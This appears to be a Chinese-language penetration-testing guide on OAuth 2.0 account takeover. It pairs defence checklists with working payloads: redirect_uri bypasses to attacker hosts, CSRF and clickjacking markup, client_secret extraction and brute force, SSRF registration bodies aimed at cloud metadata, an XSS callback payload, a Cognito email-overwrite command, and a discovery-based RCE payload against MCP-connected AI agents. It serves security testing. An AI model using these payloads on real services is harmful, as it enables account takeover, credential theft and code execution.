---
attack_surface: [认证/授权绕过, 客户端利用, 信息泄露, 配置缺陷, 竞态/时序]
impact: [身份伪造, 机密性破坏, 信息泄露, 远程代码执行]
risk_level: 严重
prerequisites:
  - OAuth 2.0 Authorization Code Grant 协议理解
  - OIDC 基础知识
  - Burp Suite 拦截代理操作
related_techniques:
  - account-takeover
  - open-redirect
  - csrf
  - clickjacking
  - race-condition
difficulty: 高级
tools:
  - Burp Suite
  - 恶意 OAuth App（自建）
  - APK 解包工具 (jadx/apktool)
---

# OAuth to Account Takeover — OAuth 2.0 账户接管全指南

> 关联文档：[Account Takeover](../README.md) · [Open Redirect](../../Reflected%20Values/Open%20Redirect/README.md) · [CSRF](../../Reflected%20Values/CSRF/README.md) · [Clickjacking](../../Reflected%20Values/Clickjacking/README.md)

---

# 0x01 OAuth 2.0 基础与攻击面概览

## 1.0 TL;DR

OAuth 2.0 是授权框架而非认证协议，但大多数实现将其用于认证（Sign in with Google/Facebook/GitHub）。这种"滥用"加上实现缺陷——从 `redirect_uri` 验证不足到 `state` 参数缺失——使得 OAuth 成为账户接管最丰富的攻击面之一。

## 1.1 OAuth 2.0 核心组件

| 组件 | 角色 |
|------|------|
| Resource Owner | 用户 — 授权访问其资源 |
| Resource Server | 持有受保护资源的服务器 |
| Client Application | 请求授权的应用 |
| Authorization Server | 颁发 Access Token 的服务器 |
| `client_id` | 公开的应用标识符 |
| `client_secret` | 机密密钥（仅应用和授权服务器知晓） |
| `redirect_uri` | 授权后的回调 URL |
| `state` | CSRF 防护参数 — 必须在整个流程中保持并验证 |
| `code` | 授权码 — 用于换取 Access Token |
| `access_token` | 用于 API 请求的 Bearer Token |
| `refresh_token` | 用于获取新的 Access Token |

## 1.2 Authorization Code Grant 流程

```
1. 用户点击 "Sign in with X"
2. 浏览器 → Authorization Server:
   GET /auth?response_type=code&client_id=CLIENT_ID
       &redirect_uri=CALLBACK&scope=SCOPES&state=RANDOM
3. 用户授权 → Authorization Server 返回:
   302 → CALLBACK?code=AUTH_CODE&state=RANDOM
4. Client 用 code + client_secret → POST /token
5. Authorization Server 返回 access_token
6. Client 用 access_token 调用 Resource Server API
```

## 1.3 OAuth ATO 攻击面全景图

```
                         OAuth 攻击面
                              │
        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
   授权请求                  令牌交换               客户端安全
   (前端可见)              (服务端)              (Native/SPA)
        │                     │                     │
  ┌─────┼──────┐       ┌─────┼──────┐       ┌─────┼──────┐
  │     │      │       │     │      │       │     │      │
redirect state prompt   code client ever-    secret PKCE  response
_uri    CSRF  bypass    reuse secret lasting  in    缺失  _mode
开放    缺失  &prompt=   +重放 brute code    APK          操纵
重定向   =none         force                      │
                                              implicit flow
                                              token 泄露
```

---

# 0x02 redirect_uri 攻击

## 2.1 redirect_uri 验证绕过

### 原理

RFC 6749 §3.1.2 要求授权服务器仅重定向到**预先注册的精确 redirect URI**。验证缺陷导致攻击者能将授权码发送到攻击者控制的端点。

### 验证绕过技术

```text
# 无验证 — 任何绝对 URL 接受
redirect_uri=https://attacker.com/callback

# 弱子串匹配
redirect_uri=https://evilmatch.com            # 如果验证只检查 "match.com" 出现
redirect_uri=https://match.com.evil.com       # 子域名绕过
redirect_uri=https://match.com.mx             # 不同 TLD
redirect_uri=https://matchAmatch.com          # 字符串内嵌
redirect_uri=https://evil.com#match.com       # Fragment 绕过
redirect_uri=https://match.com@evil.com       # Userinfo 绕过

# IDN homograph
redirect_uri=https://mátch.com                # punycode ≠ Unicode

# 允许主机上的任意路径
redirect_uri=https://match.com/openredirect?next=https://attacker.com
redirect_uri=https://match.com/user-content?xss=<script>...

# 目录约束未规范化
redirect_uri=https://match.com/oauth/../attacker

# 通配符子域名
redirect_uri=https://attacker.match.com       # *.match.com 允许
# → 子域名接管 (dangling DNS / S3 bucket) → 有效 callback

# HTTP (非 HTTPS) callbacks
redirect_uri=http://match.com/callback        # 中间人攻击
```

### 攻击流程

```
1. 构造恶意 URL:
   https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback

2. 发送给受害者

3. 受害者认证并授权

4. IdP 重定向到 attacker.tld/callback?code=<victim-code>&state=...

5. 攻击者捕获 code → 立即兑换为 access_token → ATO
```

## 2.2 允许列表域上的 Token 泄露（子路径攻击）

### 原理

即使 `redirect_uri` 锁定在可信域，如果该域存在**攻击者可控制的路径或执行上下文**（旧应用平台、用户命名空间、CMS 上传等），且 OAuth 流程在 URL 中返回令牌，攻击者可以：

1. 启动合法流程获取 pre-token
2. 将 `redirect_uri` 指向允许列表域的攻击者可控制路径
3. 受害者批准后，IdP 重定向到攻击者控制路径，令牌在 URL 中
4. 页面上的 JS 读取 `window.location` 并外泄

```text
# Facebook Accounts Center 示例
https://accountscenter.facebook.com/add/?auth_flow=frl_linking&blob=<BLOB>&token=<TOKEN>
https://accountscenter.facebook.com/profiles/<VICTIM_ID>/name/?auth_flow=reauth&blob=<BLOB>&token=<TOKEN>
```

---

# 0x03 CSRF — state 参数缺陷

## 3.1 原理

`state` 参数是 Authorization Code 流程的 **CSRF Token**。客户端必须在每个浏览器实例中生成**密码学随机值**，在授权请求中发送，并拒绝任何未返回相同值的响应。

当 `state` 是静态的、可预测的、可选的、或未与用户 Session 绑定的，攻击者可以完成自己的 OAuth 流程，捕获最终 `?code=` 请求，然后强制受害者浏览器重放该请求 → 受害者账户关联到攻击者的 IdP 身份。

## 3.2 state 测试清单

| 缺陷 | 描述 | 检测方法 |
|------|------|---------|
| **完全缺失** | `state` 参数从未出现 | 观察授权 URL |
| **非必需** | 移除 `state` 后流程仍成功 | 从 URL 中删除 `state` |
| **未验证** | 返回的 `state` 值不被检查 | 篡改回调中的 `state` 值 |
| **可预测** | 仅编码数据无随机性 | 解码 `state` (Base64) 检查熵 |
| **固定** | 用户可提供 `state` 值 | 在授权 URL 中插入自定义 `state` |

## 3.3 CSRF → ATO 攻击流

```
1. 攻击者用自己的 IdP 账户发起 OAuth 流程
2. 在最后一步拦截回调: /callback?code=ATTACKER_CODE&state=KNOWN
3. 丢弃请求，保留 URL
4. 强制受害者浏览器加载此 URL:
   <img src="https://target.com/callback?code=ATTACKER_CODE&state=KNOWN">
5. 应用消费攻击者的 code → 受害者浏览器 Session 关联到攻击者的 IdP 身份
6. 攻击者用自己的 IdP 账户登录 → 访问受害者资源 → ATO
```

---

# 0x04 令牌生命周期攻击

## 4.1 永不过期的 Authorization Code

### 测试

```bash
# 1. 捕获 code
# 2. 等待 10 分钟后兑换
curl -X POST https://idp.example/token \
  -d "code=CAPTURED_CODE&grant_type=authorization_code&redirect_uri=CALLBACK&client_id=CLIENT_ID&client_secret=SECRET"
# 如果仍然成功 → code TTL 过长

# 3. 重复使用同一 code
curl -X POST https://idp.example/token \
  -d "code=SAME_CODE&grant_type=authorization_code&..."
# 如果第二次仍返回 token → 重放漏洞

# 4. 并行兑换（竞态条件）
# 使用 Turbo Intruder 同时发送 2 个 token 请求
# 如果两次都成功 → 竞态漏洞
```

### 重放处理标准

- 重放尝试应当不仅失败，还应**撤销**该 code 已颁发的所有 token
- 否则检测到的重放仍让攻击者的第一个 token 保持活跃

## 4.2 Client Secret 泄露与暴力破解

### 提取 Client Secret

```bash
# 从 APK/IPA/桌面安装器/Electron App 中提取
# APK
unzip app.apk -d app_unpacked
grep -r "client_secret" app_unpacked/

# Electron (asar 打包)
npx asar extract app.asar app_extracted
grep -r "client_secret" app_extracted/

# 反编译后的代码
grep -r "client_secret\|CLIENT_SECRET\|oauth_secret" .
```

### Client Secret 暴力破解

```http
POST /token HTTP/1.1
Host: idp.example.com
Content-Type: application/x-www-form-urlencoded

code=KNOWN_CODE&redirect_uri=CALLBACK&grant_type=authorization_code&client_id=PUBLIC_ID&client_secret=[BRUTEFORCE]
```

### 公共客户端不应持有 Secret

对于 Native App / SPA，应使用 **PKCE (RFC 7636)** 替代 `client_secret`。PKCE 有两种变换方法：

| 方法 | code_challenge 计算 | 安全性 |
|------|---------------------|--------|
| **S256** (推荐) | `BASE64URL(SHA256(code_verifier))` | 高 — 即使 challenge 泄露也无法逆推 verifier |
| **plain** (不推荐) | `code_challenge = code_verifier` | 低 — challenge 即 verifier，中间人可直接使用 |

测试时必须确认服务端是否**强制 S256**——接受 `plain` 方法的实现使 PKCE 形同虚设。

```bash
# PKCE 验证
# 1. 检查 token 交换是否需要 code_verifier
# 2. 测试是否能省略 code_verifier 或用任意值替换
# 3. 测试 code_verifier 是否必须与 code_challenge 匹配
# 4. 测试 plain 变换方法是否被接受（不应接受）

curl -X POST https://idp.example/token \
  -d "code=XXX&code_verifier=RANDOM_WRONG_VALUE&grant_type=authorization_code&..."
# 如果成功 → PKCE 验证缺失
```

## 4.3 Token 绑定缺失

### Authorization Code 不绑定 Client

如果可以从 App A 获取 code 并在 App B 的 token 端点兑换：

```bash
# 1. 从 App A 捕获 code
# 2. 发送到 App B 的 token 端点
curl -X POST https://APP_B/token \
  -d "code=CODE_FROM_APP_A&client_id=APP_B_ID&..."
# 如果返回 token → audience 绑定缺失 → 权限提升
```

---

# 0x05 Native App 与移动端攻击

## 5.1 Redirect Scheme Hijacking

### 原理

移动端 OAuth 使用**自定义 URI Scheme** 接收回调（如 `myapp://oauth/callback`）。多个 App 可以注册同一 Scheme → 恶意 App 可以拦截 Authorization Code。

### Android 攻击

```xml
<!-- 恶意 App 的 intent-filter -->
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="myapp" android:host="oauth" />
</intent-filter>
```

受害者授权后 → 操作系统弹出"用哪个应用打开？" → 如果用户选择恶意 App → code 被拦截。

## 5.2 Access Token 泄露路径

Access Token 不应出现在用户浏览器中。检查：

| 泄露路径 | 检测 |
|---------|------|
| URL 查询参数 | `?access_token=...` |
| URL Fragment | `#access_token=...` → 可被 JS 读取 |
| `localStorage` | `localStorage.getItem("token")` |
| React/Vue Store | 全局 JS 变量 |
| HTTP 传输 | 非 HTTPS → 网络嗅探 |
| 浏览器历史 | token 在 URL 中 |

---

# 0x06 高级 OAuth 攻击向量

## 6.1 Prompt Interaction Bypass

在 OAuth 请求中添加 `&prompt=none` — 如果用户已登录 IdP，将**不显示授权确认页面**，直接重定向回调。

```text
GET /auth?response_type=code&client_id=xxx&redirect_uri=yyy&prompt=none
→ 用户静默授权（无任何提示）
→ 与 CSRF 组合利用 → 静默 ATO
```

## 6.2 response_mode 操纵

```text
response_mode=query     → code 在 GET 参数中: ?code=XXXX
response_mode=fragment  → code 在 Fragment 中: #code=XXXX
response_mode=form_post → code 在 POST body 中
response_mode=web_message → window.opener.postMessage({"code": "XXXX"})
```

如果 `response_mode=web_message` 但 target origin 验证不严格 → 跨域 postMessage 窃取 code。

## 6.3 Two Links & Cookie (Cookie 竞态)

1. 让受害者打开包含 `returnUrl=https://attacker.com` 的页面 → 存储在 Cookie 中
2. 在提示显示前关闭标签页
3. 打开新标签（无 `returnUrl` 参数）→ 提示不显示攻击者地址
4. Cookie 中仍保留攻击者地址 → Token 发送到 attacker.com

## 6.4 ROPC Flow → 2FA Bypass

OAuth Resource Owner Password Credentials (ROPC) 流程直接用用户名+密码换取 token。如果返回的 token 有完整权限且 ROPC 端点不需要 2FA → 绕过 2FA。

```http
POST /oauth/token HTTP/1.1

grant_type=password&username=victim&password=victim_pass&client_id=CLIENT_ID&client_secret=SECRET
# → 返回 access_token (无需 2FA)
```

## 6.5 Mutable Claims Attack

OAuth 的 `sub` 字段是唯一的用户标识符，但部分客户端依赖 `email` 字段来识别用户：
- 某些 IdP（如 Microsoft Entra ID）允许用户自行修改邮箱
- `email` 字段未经 IdP 验证
- 攻击者可在自己的 Azure AD 组织中创建 `victim@gmail.com` → 通过 Microsoft 登录 → 目标应用将攻击者识别为受害者

## 6.6 Client Confusion Attack

应用使用 Implicit Flow 但未验证 Access Token 的 `aud` (audience) 是否与自己的 `client_id` 匹配：
1. 攻击者建立公共网站，使用 Google OAuth Implicit Flow
2. 用户登录攻击者网站 → 攻击者获得 Access Token
3. 同一用户有另一脆弱网站的账户（不验证 token 的 client_id）
4. 攻击者用其网站的 token 访问脆弱网站 → ATO

## 6.7 Scope Upgrade Attack

在 Authorization Code Grant 中，Token 请求通常不包含 `scope`。如果 Authorization Server **隐式信任** Token 请求中的 scope 参数（RFC 未定义此参数），恶意应用可提升权限：

```http
POST /token HTTP/1.1

code=AUTH_CODE&grant_type=authorization_code&scope=admin+read+write+delete
# → 颁发比原始授权更宽泛的 Access Token
```

---

# 0x07 OAuth SSRF → RCE 攻击链

## 7.1 Dynamic Client Registration → SSRF

[PortSwigger 研究](https://portswigger.net/research/hidden-oauth-attack-vectors) 发现 OAuth 动态客户端注册端点接受恶意 URL 参数：

```http
POST /register HTTP/1.1
Content-Type: application/json

{
  "client_name": "evil",
  "redirect_uris": ["https://evil.com/callback"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/",  # ← SSRF
  "jwks_uri": "http://internal-api/admin/delete-user",      # ← SSRF
  "sector_identifier_uri": "http://metadata.internal/"       # ← SSRF
}
```

| 参数 | SSRF 触发点 |
|------|----------|
| `logo_uri` | 服务器获取客户端 Logo |
| `jwks_uri` | 服务器获取 JWK 文档 |
| `sector_identifier_uri` | 服务器获取 redirect_uris 列表 |
| `request_uris` | 授权阶段服务器获取请求对象 |

## 7.2 OAuth Discovery → OS Command Execution (CVE-2025-6514)

[AmLa Labs 研究](https://amlalabs.com/blog/oauth-cve-2025-6514/) 展示了 OAuth Discovery 如何变成 RCE 原语——当 OAuth 客户端将 IdP 返回的 `authorization_endpoint` 直接传递给操作系统的 URL handler 时。

### 为什么 OAuth Discovery 对自主 Agent 是根本性威胁

传统 OAuth 安全性依赖三个隐性假设：**存在可信 IdP**、**人类在回路中验证**、**通信信道安全**。当 AI Agent（Claude Desktop、Cursor、Windsurf 等）通过 MCP 协议动态发现并连接 OAuth 服务器时，这三个假设全部不成立：

1. **无可信 IdP** — Agent 根据用户提供的 URL 动态发现 IdP，攻击者可直接提供恶意 URL
2. **无人类验证** — Discovery 在 Agent 收到 401 响应后自动触发，用户看不到授权页面
3. **无安全信道保证** — `authorization_endpoint` 返回的 URI 被直接传递给 `xdg-open` / `start` / `open`，操作系统 URL handler 对 scheme 不做安全验证

这就是此漏洞与常规 OAuth 攻击的本质区别——**不需要受害者点击任何东西，仅在配置连接时即可触发 RCE**。

```json
// 恶意 MCP/OAuth Server 返回
HTTP/1.1 200 OK
Content-Type: application/json

{
  "authorization_endpoint": "file:/c:/windows/system32/calc.exe",
  "token_endpoint": "https://evil/idp/token"
}
```

```
攻击链:
1. 配置客户端连接到恶意 OAuth 服务器
2. 服务器返回 discovery 文档 (authorization_endpoint = 恶意 URI)
3. 客户端调用系统 URL handler → 执行任意命令
4. 在用户交互之前即完成 — 仅配置连接即可触发

受影响: mcp-remote ≤0.1.15, 任何将 OAuth discovery 端点直接传递给系统
URL handler 的桌面应用/Electron App/CLI 工具
```

### 测试方法

```bash
# 拦截或托管 discovery 响应
# 替换 authorization_endpoint 为危险 scheme:
file:///Applications/Calculator.app
file:/c:/windows/system32/calc.exe /c"powershell -enc ..."
cmd://bash -lc '<payload>'
ms-excel:|...|  (自定义 protocol handler)

# 观察客户端是否验证 scheme —— 如果未验证 → RCE
```

---

# 0x08 OAuth 回调页面的客户端攻击

## 8.1 回调页面的 XSS (error_description 反射)

OAuth 回调页通常将 IdP 返回的 `error_description` 渲染到 HTML 中。如果未进行输出编码 → **可信源 XSS**。

```text
https://app.target.com/oauth/callback?error=access_denied&error_description=<body onpagereveal=open("https://attacker.com")>
```

### Safari 专用 Payload

```html
<!-- 当常规事件处理被 WAF 拦截时 -->
<body onpagereveal=open("https://attacker.example")>
This step can only be completed in Safari
```

### 自引用 Payload

```javascript
// 如果注入的 HTML/JS 能重新打开同一 URL
// → 客户端资源耗尽 / 重复弹窗 / 日志洪泛
```

## 8.2 state 参数泄露

许多实现将 JSON 或用户元数据 Base64 编码后存储在 `state` 中：

```python
import base64
# 总是解码 state 值检查 PII 泄露
decoded = base64.urlsafe_b64decode(state + "==")
print(decoded)  # 可能包含 email, tenant_id, return_path, 内部状态
```

URL 中的任何内容都可能出现在浏览器历史、反向代理日志、负载均衡器日志、监控系统截图中。

---

# 0x09 Clickjacking & 其他向量

## 9.1 Clickjacking OAuth Consent 对话框

OAuth 授权/登录对话框是理想的 Clickjacking 目标——如果可被 frame：

```html
<iframe sandbox="allow-forms allow-scripts allow-same-origin"
        src="https://idp.example/auth?response_type=code&client_id=VICTIM_APP&redirect_uri=VICTIM_CALLBACK&scope=admin">
</iframe>
<!-- 覆盖假按钮 → 隐藏的 "Allow" → 受害者批准攻击者的 scope -->
```

检查 IdP 是否发送 `X-Frame-Options: DENY` 或 `Content-Security-Policy: frame-ancestors 'none'`。

## 9.2 AWS Cognito Token 权限过大

在 [Flickr ATO 报告](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) 中，AWS Cognito 返回的 Access Token 有足够权限覆盖用户属性：

```bash
# 读取用户信息
aws cognito-idp get-user --region us-east-1 --access-token <TOKEN>

# 更改邮箱（无额外验证）
aws cognito-idp update-user-attributes --region us-east-1 \
  --access-token <TOKEN> \
  --user-attributes Name=email,Value=attacker@evil.com
```

## 9.3 Referer/Header/Location 泄露 Code + State

```text
# 经典 Referer 泄露
1. OAuth 回调: /callback?code=XXX&state=YYY
2. 页面加载 <img src="https://cdn.third-party.com/pixel.gif">
3. Referer 头包含完整的 ?code=XXX&state=YYY → 第三方 CDN

# postMessage 中继泄露
1. SDK 响应 postMessage → 发送当前 location.href 到后端
2. 攻击者注入自己的 token 到 postMessage 流程
3. 从 SDK API 日志中提取受害者的 OAuth code
```

---

# 0x0A 防御策略

## 10.1 OAuth 实现安全清单

| 组件 | 要求 |
|------|------|
| `redirect_uri` | **精确匹配**预注册值，不接受通配符/子串 |
| `state` | **密码学随机 + Session 绑定**，拒绝缺失/不匹配的回调 |
| Authorization Code | **一次性 + 短 TTL**（< 5 分钟），重放时撤销关联 token |
| `client_secret` | **永不**出现在公共客户端（SPA/Native App）中 |
| PKCE (RFC 7636) | **公共客户端必须使用**，服务端强制验证 `code_verifier` |
| Token 绑定 | Access Token 绑定到 `client_id` + 请求时的 `redirect_uri` |
| Scope 验证 | Token 端点不接受 scope 参数，使用授权时确定的 scope |
| `prompt=none` | 需要额外的 CSRF 防护或在敏感操作时禁用 |
| Error 页面 | 对 `error_description` 进行严格的输出编码，不反射 HTML |
| Clickjacking 防护 | IdP 页面发送 `X-Frame-Options: DENY` |
| Discovery 端点 | 验证返回的 URI scheme（仅允许 `https://`），不过度信任 |
| Native App | 使用 PKCE + App Links / Universal Links 代替自定义 Scheme |
| ROPC Flow | 不在面向用户的授权服务器上暴露，或强制 2FA |

## 10.2 OAuth 测试清单

- [ ] `redirect_uri` 是否精确匹配？能否用子串/子域名/Path Traversal 绕过？
- [ ] `state` 参数是否强制？是否密码学随机？是否 Session 绑定？
- [ ] Authorization Code 是否一次性使用？TTL 是否合理？
- [ ] Code 是否可跨 Client 兑换？（A 应用 code → B 应用 token）
- [ ] `client_secret` 是否在 APK/SPA/Electron App 中泄露？
- [ ] Dynamic Client Registration 的 URL 参数是否有 SSRF 风险？
- [ ] Discovery 端点返回的 URI 是否被客户端直接传递给系统 URL handler？
- [ ] `prompt=none` 是否可被滥用进行静默授权？
- [ ] `response_mode` 参数是否引入新的攻击面？
- [ ] OAuth 回调页是否有 XSS（error_description 反射）？
- [ ] Implicit Flow token 是否验证 `aud` (audience/client_id)？
- [ ] ROPC Flow 是否绕过 2FA？
- [ ] 移动端是否使用自定义 Scheme（可被劫持）vs App Links？
- [ ] 回调后的页面是否向第三方域名发送带有 code/state 的 Referer？

---

## 参考资料

- [RFC 6749 — The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749)
- [RFC 7636 — Proof Key for Code Exchange (PKCE)](https://www.rfc-editor.org/rfc/rfc7636)
- [PortSwigger — Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [NCC Group — Offensive Guide to Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [Doyensec — OAuth Common Vulnerabilities](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [AmLa Labs — CVE-2025-6514 OAuth Discovery RCE](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Flickr ATO via AWS Cognito](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/)
- [Leaking FXAuth Token via allowlisted Meta domains](https://ysamm.com/uncategorized/2026/01/16/leaking-fxauth-token.html)
- [Salt Security — Oh-Auth: Abusing OAuth to Take Over Millions of Accounts](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts)
- [USENIX 2025 — QR Code-based Login (In)Security](https://www.usenix.org/conference/usenixsecurity25/presentation/zhang-xin)
- [The Wonderful World of OAuth — Bug Bounty Edition](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
